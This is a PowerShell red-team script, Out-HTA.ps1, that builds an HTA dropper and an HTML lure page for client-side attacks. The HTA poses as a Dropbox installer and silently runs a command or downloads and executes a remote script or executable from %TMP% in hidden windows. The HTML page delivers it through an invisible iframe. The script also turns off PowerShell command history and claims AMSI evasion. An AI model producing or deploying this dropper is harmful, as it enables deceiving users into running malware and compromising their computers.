<#
.SYNOPSIS
   Create 'application.hta' and 'webpage.html' for client side attacks!
  
   Author: r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits | Linux kali x64 bits
   Required Dependencies: none
   Optional Dependencies: Invoke-WebRequest {native}
   PS cmdlet Dev version: v2.3.14
   
.DESCRIPTION
   This cmdlet creates 'application.hta' and 'webpage.html' for client side attacks.
   Application.hta download\execute ps1 scripts\commands while webpage.html its used
   to deliver the dropper file (application.hta) using target web browser interface.
   
.NOTES
   _Remark: HTA appl download\execute BAT, PS, VBS, PE (exe) or python scripts!
   _Remark: HTA appl accepts: cmd, python or powershell cmdlines to be executed!
   _Remark: -PayloadURL '<string>' -PSargs '<-parameter> <arg>' if your script.ps1 contains any parameters!
   Credits: Source Code inspired from nishang project and modified to evade amsi string detection and more!

.Parameter Payload
  The cmdline for the HTA application to execute!

.Parameter PayloadURL
  The remote URL link to be download\executed by HTA

.Parameter Hidden
  Hidden HTA terminal console popups? (default: True)

.Parameter HtaName
  The HTA file name to be created (default: DropboxInstaller)
  
.Parameter PSargs
   The PS script parameters\arguments to run (default: False)  
  
.Parameter HTML
   Create HTML webpage to download the HTA appl? (default: True)
   
.Parameter Favicon
   The icon.ICO (local or url link) to use as HTA\HTML favicon icon
   
.Parameter HTMLimage
   The image.JPG\PNG (local or url link) to use as HTML background image
   
.EXAMPLE
   PS C:\> Get-Help .\Out-HTA.ps1 -full
   Access this cmdlet comment based help   

.EXAMPLE
   PS C:\> .\Out-HTA.ps1 -Payload "powershell echo Executed. > testme.txt"
   Generate HTA (to execute payload) and HTML files in current directory!

.EXAMPLE
   PS C:\> .\Out-HTA.ps1 -Payload "powershell -noprofile -noexit -C Get-ChildItem" -Hidden False
   Generate HTA (exec payload) and HTML files in current dir with HTA appl messageBox (not hidden)

.EXAMPLE
   PS C:\> .\Out-HTA.ps1 -Payload "powershell -C Get-ChildItem" -HTMLimage "https://wallpapercave.com/wp/vgArgkE.jpg"
   Generate HTA (exec payload) and HTML files in current dir with HTA appl messageBox hidden and set HTML background image

.EXAMPLE
   PS C:\> .\Out-HTA.ps1 -PayloadURL "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/PSexecutionPolicy.bat" -Hidden False
   Generate HTA (download\exec payload) and HTML files in current directory with HTA appl messageBox (not hidden)

.EXAMPLE
   PS C:\> .\Out-HTA.ps1 -PayloadURL "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetCounterMeasures.ps1" -HtaName testme
   Generate HTA (download\exec payload) and HTML files in current directory but rename application.hta and webpage.html file names to 'testme'

.EXAMPLE
   PS C:\> .\Out-HTA.ps1 -PayloadURL "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -PSargs "-Sysinfo verbose" -Hidden False
   Generate HTA (download\exec payload with parameters\arguments) and HTML files in current directory with HTA appl messageBox (not hidden)

.INPUTS
   None. You cannot pipe objects into Out-HTA.ps1

.OUTPUTS
   Create HTA and HTML files for client side attacks
   -------------------------------------------------
   Cmdline to execute    : powershell -NoExit -C Get-ChildItem
   HTML file written to  : C:\Users\ragnarok\Desktop\DropboxInstaller.html
   _HTA file written to  : C:\Users\ragnarok\Desktop\DropboxInstaller.hta
   _HTA hidden execution : False

.LINK
   https://github.com/samratashok/nishang
   http://eddiejackson.net/wp/?page_id=2011
   https://github.com/r00t-3xp10it/PandoraBox
   http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html   
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$HTML="True",
   [string]$Hidden="True",
   [string]$PSargs="False",   
   [string]$Payload="False",
   [string]$PayloadURL="False",
   [string]$HtaName="DropboxInstaller",
   [string]$HTAFilePath="$pwd\$HtaName",
   [string]$Favicon="https://cfl.dropboxstatic.com/static/images/favicon-vflY996NT.ico",
   [string]$HTMLimage="https://user-images.githubusercontent.com/23490060/123878649-67a18780-d937-11eb-900e-bb8a8bdc5314.png"
)


$debugMe = "False"
$CmdletVersion = "v2.3.14"
## Global cmdlet variable declarations
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@Out-HTA $CmdletVersion {SSA@RedTeam}"
If(Test-Path -Path "$HTAFilePath.hta" -EA SilentlyContinue)
{
   ## Del artifacts left behind by previous runs.
   Remove-Item -Path "$HTAFilePath.hta" -EA SilentlyContinue -Force
   Remove-Item -Path "$HTAFilePath.html" -EA SilentlyContinue -Force
}


## banner
$mYbANNER = @"

 █████╗ ██╗   ██╗████████╗     ██╗  ██╗████████╗ █████╗
██╔══██╗██║   ██║╚══██╔══╝     ██║  ██║╚══██╔══╝██╔══██╗
██║  ██║██║   ██║   ██║ █████╗ ███████║   ██║   ███████║
██║  ██║██║   ██║   ██║ ╚════╝ ██╔══██║   ██║   ██╔══██║
╚█████╔╝╚██████╔╝   ██║        ██║  ██║   ██║   ██║  ██║
 ╚════╝  ╚═════╝    ╚═╝        ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝

"@;
Clear-Host;
Write-Host "$mYbANNER"

If($HTML -ieq "True")
{
   Write-Host "`nCreate HTA and HTML files for client side attacks" -ForeGroundColor Green
   Write-Host "-------------------------------------------------"
}
Else
{
   Write-Host "`nCreate HTA application for client side attacks" -ForeGroundColor Green
   Write-Host "----------------------------------------------"
}


If($Payload -ieq "False" -and $PayloadURL -ieq "False")
{
   ## Make sure attacker have sellected at least ONE of the cmdlet mandatory parameters!
   Write-Host "[error:] cmdlet requires -Payload '<string>' or -PayloadURL '<url>' arguments!" -ForeGroundColor Red -BackGroundColor Black
   Write-Host "";Start-Sleep -Seconds 2

$Help = @"
.HELPER
   _Remark: -Payload accepts: cmd, python or powershell cmdlines to be executed!
   _Remark: -PayloadURL downloads\executes BAT, PS, VBS, PE (exe) or python scripts!

.Parameter Payload "<string>"
   The cmdline for the HTA application to execute!

.Parameter PayloadURL "<url>"
   The remote URL link to be download\executed by HTA

.EXAMPLE
   PS C:\> .\Out-HTA.ps1 -Payload "powershell echo Executed. > testme.txt"
   Generate HTA (to execute payload string) and HTML files in current dir.
   _Remark: If executed the HTA creates 'testme.txt' on current directory.

.EXAMPLE
   PS C:\> .\Out-HTA.ps1 -PayloadURL "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1"
   Generate HTA (to download\execute sysinfo.ps1 remote script) and HTML files in current directory.
   _Remark: If executed the HTA downloads\executes the sysinfo.ps1 from target %tmp% directory.

"@;
Write-Host "$Help"
exit ## Exit @Out-HTA
  
}
ElseIf($Payload -ne "False" -and $PayloadURL -ne "False")
{
   Write-Host "[error:] cmdlet only accepts ONE mandatory parameter at once -Payload or -PayloadURL" -ForeGroundColor Red -BackGroundColor Black
   Write-Host "";Start-Sleep -Seconds 2;Get-Help .\Out-HTA.ps1 -Detailed;exit ## Exit @Out-HTA  
}

If($Payload -ne "False")
{
   If($PSargs -ne "False")
   {
      ## Config exec parameters!
      $cdmline = "$Payload $PSargs"
      Write-Host "Cmdline to execute    : $cdmline" -ForegroundColor DarkYellow
   }
   Else
   {
      $cdmline = "$Payload"
      Write-Host "Cmdline to execute    : $cdmline" -ForegroundColor DarkYellow
   }
}

If($Hidden -ieq "True")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - HTA MessageBox popup's {hidden|visible} state!
   #>

   $WindowState = "minimize"
   $psstring = "powershell -WindowStyle Hidden"
   $TermState = ",0,true`n       self.close()`n    </script>"
}
Else
{
   $WindowState = "Normal"
   $psstring = "powershell -WindowStyle Hidden"
   $TermState = "`n    </script>"
}

If($PayloadURL -ne "False")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Config cmdline + download execution parameters!
   #>

   If($PayloadURL -iNotMatch '^[http(s)://]')
   {
      ## Make sure we are downloading from network   
      Write-Host "[error:] This cmdlet only accepts http(s) url links!" -ForeGroundColor Red -BackGroundColor Black
      Write-Host "[syntax] https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetCounterMeasures.ps1" -ForeGroundColor Yellow
      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @Out-HTA
   }

   If($PayloadURL -iNotMatch '(.ps1|.bat|.py|.vbs|.exe)$')
   {
      ## Make sure we are downloading payloadurl accepted extensions!
      Write-Host "[error:] cmdlet only accepts (.bat|.ps1|.py|.vbs|.exe) PayloadURL extensions!" -ForeGroundColor Red -BackGroundColor Black
      Write-Host "[syntax] https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/PSexecutionPolicy.bat" -ForeGroundColor Yellow   
      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @Out-HTA      
   }

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Sellect payload (cmdline) execution based on is extension

   .NOTES
      Execute {.bat|.ps1|.py|.vbs|.exe} PayloadURL's
      Remark: If -Hidden 'False' parameter is sellected then cmdlet will only spawn
      HTA messageBox without the downloaded script execution terminal console popup's.
      Remark: If $debugMe is activated, then payload execution console will stay open.
   #>

   $rawName = $PayloadURL.split('/')[-1]
   If($PayloadURL -iMatch '(.bat|.vbs)$')
   {
      $uuid = "cd $Env:TMP;powershell -WindowStyle Hidden $rawName"  
   }
   ElseIf($PayloadURL -iMatch '(.ps1)$')
   {
      $uuid = "cd $Env:TMP;powershell -WindowStyle Hidden -File $rawName"
   }
   ElseIf($PayloadURL -iMatch '(.py)$')
   {
      $uuid = "cd $Env:TMP;powershell -WindowStyle Hidden python3 $rawName"
   }
   ElseIf($PayloadURL -iMatch '(.exe)$')
   {
      $uuid = "cd $Env:TMP;powershell -WindowStyle Hidden .\${rawName}"
   }


   If($Hidden -ieq "False" -and $debugMe -ieq "True")
   {
   
      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Debug HTA\PS functions! {terminal console visible}
         
      .NOTES
         If sellected -Hidden '<false>' and $debugMe = "True" (line 107) then
         this function will replace powershell '-WindowStyle Hidden' switch by
         powershell -NoExit switch, that maintains the PS terminal consoles open.
      #>

      $uuid = $uuid -replace '-WindowStyle Hidden','-NoExit'
      $psstring = $psstring -replace 'powershell -WindowStyle Hidden','powershell'
   }


   If($PSargs -ne "False")
   {
      ## Parse URL data (remote url cmdlet name)
      Write-Host "Cmdline to execute    : $PayloadURL $PSargs" -ForegroundColor DarkYellow
      $cdmline = "$psstring iwr -Uri $PayloadURL -OutFile $Env:TMP\$rawName;$uuid $PSargs"
   }
   Else
   {
      Write-Host "Cmdline to execute    : $PayloadURL" -ForegroundColor DarkYellow
      $cdmline = "$psstring iwr -Uri $PayloadURL -OutFile $Env:TMP\$rawName;$uuid"  
   }
}


#HTA
#icon="%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\Edge Profile.ico"
$HTAFile = @"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
<title>$HtaName</title>

    <hta:application
       id="oHTA"
       icon="$Favicon"
       windowState="$WindowState"
       applicationname="$HtaName"
       showintaskbar="yes"
       application="yes">
    </hta:application>

    <script language="VBScript">
       set iOStream = CreateObject("Wscript.Shell")
       iOStream.Run("$cdmline")$TermState

    <script type="text/javascript">
    function openURL()
    {
       var DropMe = new ActiveXObject("WScript.Shell");
       DropMe.Run("https://www.dropbox.com/login");
    }
    </script>

</head>
<body>
<div> 
   <object type="text/html" data="https://www.dropbox.com/features/share" width="100%" height="100%">
   </object></div><br><center><input type="button" onclick="openURL()" value="LogIn to Dropbox"></center>
</body>
</html>
"@


#HTML
$HTMLFile = @"
<html><head></head>
<title>$HtaName</title>
   <link rel="shortcut icon" type="image/jpg" href="$Favicon"/>
   <iframe id="frame" src="$HtaName.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>
   <body background="$HTMLimage">    
</body></html>
"@


$htaext = "$HTAFilePath"+".hta" -Join ''
$exthtm = "$HTAFilePath"+".html" -Join ''
## Create HTA\HTML files in current directory!
If($HTML -ieq "True")
{
   Out-File -InputObject $HTMLFile -FilePath "$exthtm"
   Write-Host "HTML file written to  : $exthtm"
}
Out-File -InputObject $HTAFile -FilePath "$htaext"
Write-Host "_HTA file written to  : $htaext"

If($Hidden -ieq "False" -and $debugMe -ieq "True"){$Hidden = "DebugMe (visible)"}
Write-Host "_HTA hidden execution : $Hidden"
Write-Host "";exit

